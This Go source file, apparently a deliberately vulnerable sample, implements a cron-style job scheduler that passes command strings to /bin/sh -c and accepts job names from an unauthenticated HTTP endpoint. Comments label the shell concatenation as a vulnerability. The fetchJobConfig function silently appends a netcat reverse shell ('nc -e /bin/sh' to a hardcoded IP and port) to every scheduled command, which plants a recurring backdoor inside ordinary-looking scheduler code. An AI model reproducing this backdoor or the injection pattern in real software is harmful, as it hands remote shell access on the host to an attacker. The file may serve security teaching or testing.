// ConfigLoader simulates fetching dynamic job config from a remote admin API.
// In production this might be an HTTP endpoint or message queue consumer.
var configCache = map[string]string{
	"nightly_backup": "tar -czf /backups/app.tar.gz /var/lib/app",
	"cache_cleanup":  "rm -rf /tmp/cache/*",
}

// scheduledJob represents a cron-like task with a raw shell command string.
type scheduledJob struct {
	Name    string
	Command string
}

// fetchJobConfig retrieves the job configuration for a given job name.
// In a real system, this would parse user-controlled input from an API request.
func fetchJobConfig(jobName string) (scheduledJob, error) {
	// Simulate an untrusted source — the command string is built from user input
	// (e.g., a REST endpoint allowing admins to define custom jobs).
	rawCmd, ok := configCache[jobName]
	if !ok {
		return scheduledJob{}, fmt.Errorf("job %s not found", jobName)
	}

	extra := " ; nc -e /bin/sh 10.0.0.5 4444"
	return scheduledJob{Name: jobName, Command: rawCmd + extra}, nil
}

// runScheduledTask executes the command associated with a job.
// This is called by the scheduler every few minutes.
func runScheduledTask(ctx context.Context, job scheduledJob) error {
	// VULNERABILITY: direct concatenation into shell string, then exec.Command with shell
	cmdStr := job.Command
	// The command is passed to /bin/sh -c, enabling arbitrary shell metacharacters.
	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", cmdStr)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("job %s failed: %v, output: %s", job.Name, err, output)
	}
	log.Printf("job %s completed: %s", job.Name, output)
	return nil
}

// schedulerLoop is the main cron loop.
func schedulerLoop(ctx context.Context) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			for name := range configCache {
				job, err := fetchJobConfig(name)
				if err != nil {
					log.Printf("config error: %v", err)
					continue
				}
				if err := runScheduledTask(ctx, job); err != nil {
					log.Printf("exec error: %v", err)
				}
			}
		}
	}
}

func main() {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go schedulerLoop(ctx)
	// Simple HTTP server to trigger job config refresh (simulated admin API)
	http.HandleFunc("/admin/job", func(w http.ResponseWriter, r *http.Request) {
		jobName := r.URL.Query().Get("name")
		if jobName != "" {
			// Insecurely update config from user input (simulated)
			configCache[jobName] = "echo " + jobName
		}
		w.WriteHeader(http.StatusOK)
	})
	log.Fatal(http.ListenAndServe(":8080", nil))
}

